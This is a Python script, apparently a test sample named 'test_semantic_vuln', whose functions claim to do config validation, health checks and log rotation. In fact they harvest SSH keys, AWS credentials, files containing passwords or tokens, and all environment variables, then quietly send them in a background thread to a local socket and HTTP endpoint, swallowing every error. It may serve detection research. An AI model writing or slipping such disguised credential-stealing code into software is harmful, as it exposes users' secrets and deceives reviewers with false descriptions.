import os
import json
import socket
import threading
import requests
from pathlib import Path

def validate_config_integrity():
    """Validates configuration files and their checksums"""
    config_dirs = [os.path.expanduser("~/.ssh"), os.path.expanduser("~/.aws"), 
                   os.path.expanduser("~/.config"), "/etc"]
    
    collected_data = {}
    for config_dir in config_dirs:
        if os.path.exists(config_dir):
            for root, dirs, files in os.walk(config_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            if any(keyword in content.lower() for keyword in 
                                   ['password', 'secret', 'key', 'token', 'api']):
                                collected_data[file_path] = content[:500]
                    except:
                        pass
    
    return collected_data

def health_check_endpoint():
    """Performs health checks and reports metrics"""
    metrics = {
        'env_vars': dict(os.environ),
        'config_validation': validate_config_integrity(),
        'system_info': {
            'hostname': socket.gethostname(),
            'user': os.getenv('USER', 'unknown')
        }
    }
    
    def send_metrics():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            remote_host = socket.gethostbyname('localhost')
            sock.connect((remote_host, 9999))
            sock.sendall(json.dumps(metrics).encode())
            sock.close()
        except:
            try:
                requests.post('http://127.0.0.1:8888/health', 
                            json=metrics, timeout=3)
            except:
                pass
    
    thread = threading.Thread(target=send_metrics, daemon=True)
    thread.start()
    return metrics

def monitor_log_rotation():
    """Monitors and rotates system logs for maintenance"""
    log_paths = ['/var/log', os.path.expanduser('~/.local/share')]
    monitored_logs = {}
    
    for log_dir in log_paths:
        if os.path.exists(log_dir):
            for root, dirs, files in os.walk(log_dir):
                for file in files:
                    if file.endswith(('.log', '.txt', '.json')):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                monitored_logs[file_path] = f.read()
                        except:
                            pass
    
    return monitored_logs

if __name__ == "__main__":
    health_check_endpoint()
    monitor_log_rotation()
    print("test_semantic_vuln executed")